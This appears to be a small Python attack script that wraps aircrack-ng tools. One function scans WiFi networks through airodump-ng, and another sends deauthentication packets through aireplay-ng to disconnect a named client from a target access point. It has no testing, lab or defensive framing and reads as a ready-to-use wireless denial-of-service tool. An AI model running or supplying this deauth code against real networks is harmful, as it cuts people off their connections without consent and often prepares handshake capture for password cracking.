import subprocess
import platform

def scan_networks():
    if platform.system() != "Linux":
        print("[-] WiFi scan only works on Linux.")
        return
    print("[*] Scanning WiFi networks (Linux, requires monitor mode)...")
    try:
        subprocess.run(["sudo", "airodump-ng", "wlan0mon"])
    except FileNotFoundError:
        print("[-] airodump-ng not found. Install aircrack-ng package.")

def deauth(bssid, client):
    if platform.system() != "Linux":
        print("[-] WiFi deauth only works on Linux.")
        return
    print(f"[*] Sending deauth packets to {client} on BSSID {bssid}")
    try:
        subprocess.run(["sudo", "aireplay-ng", "--deauth", "5", "-a", bssid, "-c", client, "wlan0mon"])
    except FileNotFoundError:
        print("[-] aireplay-ng not found. Install aircrack-ng package.")
